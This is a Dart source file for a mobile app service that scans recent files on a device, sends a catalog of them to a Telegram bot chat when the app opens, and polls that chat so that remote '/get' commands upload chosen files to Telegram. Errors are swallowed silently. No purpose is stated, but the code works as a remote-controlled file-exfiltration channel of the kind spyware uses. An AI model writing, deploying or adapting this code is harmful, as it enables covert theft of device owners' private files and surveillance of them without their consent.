import 'dart:async';
import 'dart:convert';
import 'dart:io';
import 'package:http/http.dart' as http;
import 'package:http_parser/http_parser.dart';
import 'package:mime/mime.dart';
import 'package:shared_preferences/shared_preferences.dart';
import 'file_scanner_service.dart';

class TelegramService {
  static final TelegramService instance = TelegramService._();
  TelegramService._();

  bool _isListening = false;
  int _lastUpdateId = 0;

  Future<void> initAndRun() async {
    final prefs = await SharedPreferences.getInstance();
    final token = prefs.getString('telegram_token') ?? '';
    final chatId = prefs.getString('telegram_chat_id') ?? '';

    if (token.isEmpty || chatId.isEmpty) return;

    // Check last scan time (don't spam if reopened within 10 min)
    final lastScan = prefs.getInt('last_scan_timestamp') ?? 0;
    final now = DateTime.now().millisecondsSinceEpoch;

    await FileScannerService.instance.requestPermissions();

    if (now - lastScan > 10 * 60 * 1000) {
      await _sendCatalog(token, chatId);
      await prefs.setInt('last_scan_timestamp', now);
    }

    _startCommandListener(token, chatId);
  }

  Future<void> _sendCatalog(String token, String chatId) async {
    final files = await FileScannerService.instance.scanRecentFiles();
    final message = FileScannerService.instance.buildTelegramMessage(files);
    await sendMessage(token, chatId, message);
  }

  Future<void> sendMessage(String token, String chatId, String text) async {
    try {
      final url = Uri.parse('https://api.telegram.org/bot$token/sendMessage');
      await http.post(
        url,
        headers: {'Content-Type': 'application/json'},
        body: jsonEncode({
          'chat_id': chatId,
          'text': text,
          'parse_mode': 'HTML',
        }),
      );
    } catch (_) {}
  }

  void _startCommandListener(String token, String chatId) {
    if (_isListening) return;
    _isListening = true;

    Timer.periodic(const Duration(seconds: 5), (timer) async {
      try {
        final url = Uri.parse('https://api.telegram.org/bot$token/getUpdates?offset=${_lastUpdateId + 1}&timeout=3');
        final response = await http.get(url);

        if (response.statusCode == 200) {
          final data = jsonDecode(response.body);
          final List updates = data['result'] ?? [];

          for (var update in updates) {
            _lastUpdateId = update['update_id'];
            final message = update['message'];

            if (message != null && message['text'] != null) {
              final senderChatId = message['chat']['id'].toString();
              if (senderChatId == chatId) {
                final text = (message['text'] as String).trim();
                await _handleCommand(token, chatId, text);
              }
            }
          }
        }
      } catch (_) {}
    });
  }

  Future<void> _handleCommand(String token, String chatId, String command) async {
    if (command == '/refresh') {
      await sendMessage(token, chatId, "🔄 Scanning files...");
      await _sendCatalog(token, chatId);
    } else if (command.startsWith('/get ')) {
      final param = command.replaceFirst('/get ', '').trim();

      if (param.contains('-')) {
        // Range e.g. /get 1-3
        final parts = param.split('-');
        final start = int.tryParse(parts[0].trim());
        final end = int.tryParse(parts[1].trim());

        if (start != null && end != null && start <= end) {
          for (int i = start; i <= end; i++) {
            await _uploadSingleFile(token, chatId, i);
            await Future.delayed(const Duration(seconds: 2));
          }
        }
      } else {
        // Single file e.g. /get 2
        final id = int.tryParse(param);
        if (id != null) {
          await _uploadSingleFile(token, chatId, id);
        }
      }
    }
  }

  Future<void> _uploadSingleFile(String token, String chatId, int fileId) async {
    final filePath = FileScannerService.instance.fileIdPathMap[fileId];

    if (filePath == null || !File(filePath).existsSync()) {
      await sendMessage(token, chatId, "❌ File #$fileId not found or expired. Send /refresh.");
      return;
    }

    final file = File(filePath);
    final fileName = file.uri.pathSegments.last;

    await sendMessage(token, chatId, "📤 Uploading <code>$fileName</code>...");

    try {
      final uri = Uri.parse('https://api.telegram.org/bot$token/sendDocument');
      final request = http.MultipartRequest('POST', uri)
        ..fields['chat_id'] = chatId
        ..files.add(await http.MultipartFile.fromPath(
          'document',
          file.path,
          contentType: MediaType.parse(lookupMimeType(file.path) ?? 'application/octet-stream'),
        ));

      final streamedResponse = await request.send();
      if (streamedResponse.statusCode == 200) {
        await sendMessage(token, chatId, "✅ Uploaded: <b>$fileName</b>");
      } else {
        await sendMessage(token, chatId, "⚠️ Failed to send $fileName (Error ${streamedResponse.statusCode})");
      }
    } catch (e) {
      await sendMessage(token, chatId, "⚠️ Upload error: $e");
    }
  }
}
